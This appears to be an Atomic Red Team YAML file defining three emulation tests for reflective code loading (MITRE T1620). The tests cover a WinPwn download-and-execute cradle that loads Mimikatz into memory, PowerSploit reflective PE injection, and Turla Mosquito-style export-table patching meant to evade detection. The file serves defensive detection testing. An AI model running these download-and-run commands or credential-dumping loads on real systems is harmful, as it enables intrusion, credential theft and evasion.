attack_technique: T1620
display_name: "Reflective Code Loading"
atomic_tests:
- name: WinPwn - Reflectively load Mimik@tz into memory
  auto_generated_guid: 56b9589c-9170-4682-8c3d-33b86ecb5119
  description: Reflectively load Mimik@tz into memory technique via function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      mimiload -consoleoutput -noninteractive
    name: powershell
- name: Reflective PE Injection via PowerSploit
  auto_generated_guid: 114c2b95-d992-4c03-8c38-fc58420a3eb5
  description: |
    Uses PowerSploit's Invoke-ReflectivePEInjection to reflectively load a PE file into the
    current PowerShell process.

    Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1
  supported_platforms:
  - windows
  input_arguments:
    script_url:
      description: URL to download Invoke-ReflectivePEInjection.ps1
      type: url
      default: https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/dev/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1
    script_path:
      description: Local path to save Invoke-ReflectivePEInjection.ps1
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-ReflectivePEInjection.ps1
    pe_path:
      description: Path to the PE file to reflectively load
      type: path
      default: PathToAtomicsFolder\T1620\bin\reflective_load.dll
    pe_url:
      description: URL to download PE file from if not available locally
      type: url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1620/bin/reflective_load.dll
    exe_args:
      description: Arguments passed to the reflectively loaded executable
      type: string
      default:
  dependency_executor_name: powershell
  dependencies:
  - description: Invoke-ReflectivePEInjection.ps1 must be on disk
    prereq_command: |
      if (Test-Path "#{script_path}") { exit 0 } else { exit 1 }
    get_prereq_command: |
      New-Item -Type Directory (Split-Path "#{script_path}") -ErrorAction Ignore -Force | Out-Null
      Invoke-WebRequest -Uri "#{script_url}" -OutFile "#{script_path}"
  - description: PE file must be on disk
    prereq_command: |
      if (Test-Path "#{pe_path}") { exit 0 } else { exit 1 }
    get_prereq_command: |
      Remove-Item -Path "$env:TEMP\T1620_pe_downloaded" -Force -ErrorAction SilentlyContinue
      New-Item -Type Directory (Split-Path "#{pe_path}") -ErrorAction Ignore -Force | Out-Null
      Invoke-WebRequest -Uri "#{pe_url}" -OutFile "#{pe_path}"
      New-Item -Type File "$env:TEMP\T1620_pe_downloaded" -Force | Out-Null
  executor:
    name: powershell
    elevation_required: false
    command: |
      Import-Module "#{script_path}"
      Invoke-ReflectivePEInjection -PEPath "#{pe_path}" -ExeArgs "#{exe_args}"
    cleanup_command: |
      Remove-Item "#{script_path}" -Force -ErrorAction SilentlyContinue
      if (Test-Path "$env:TEMP\T1620_pe_downloaded") {
        Remove-Item "#{pe_path}" -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:TEMP\T1620_pe_downloaded" -Force
      }
- name: Turla Mosquito (CommanderDLL.dll) Dynamic Export Address Table (EAT) Patching
  auto_generated_guid: 7c3e0b89-09e6-4f3c-a1e8-1c1dfa9288ce
  description: |
    Emulates the behavior of Turla's Mosquito main backdoor. Loads a benign DLL that has no export for "StartRoutine" on disk. During
    DllMain, the DLL constructs an IMAGE_EXPORT_DIRECTORY in memory at the tail of its mapped image (past .reloc), then patches its own PE header's
    data-directory entry so the export RVA points to the fabricated table. Effectively hides the DLL's real entry point from static analysis and export-name-based detection.

  supported_platforms:
  - windows
  input_arguments:
    dll_path:
      description: Path to the compiled EAT-patching DLL
      type: path
      default: PathToAtomicsFolder\T1620\bin\CommanderDLL.dll
  dependencies:
  - description: The EAT-patching DLL must be present on disk
    prereq_command: |
      if (Test-Path "#{dll_path}") { exit 0 } else { exit 1 }
    get_prereq_command: |
      New-Item -Type Directory (Split-Path "#{dll_path}") -ErrorAction Ignore -Force | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/atomics/T1620/bin/CommanderDLL.dll?raw=true" -OutFile "#{dll_path}"
      New-Item -Type File $env:TEMP\EAT_dll_downloaded -ErrorAction Ignore -Force | Out-Null
  dependency_executor_name: powershell
  executor:
    command: |
      Add-Type -MemberDefinition @'
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr LoadLibraryA(string lpFileName);
      '@ -Name "Win32" -Namespace "EATTest" -PassThru | Out-Null
      [EATTest.Win32]::LoadLibraryA("#{dll_path}")
    cleanup_command: |
      if(Test-Path -Path $env:TEMP\EAT_dll_downloaded){
        Remove-Item "#{dll_path}" -Force -ErrorAction Ignore
      }
    name: powershell
    elevation_required: false
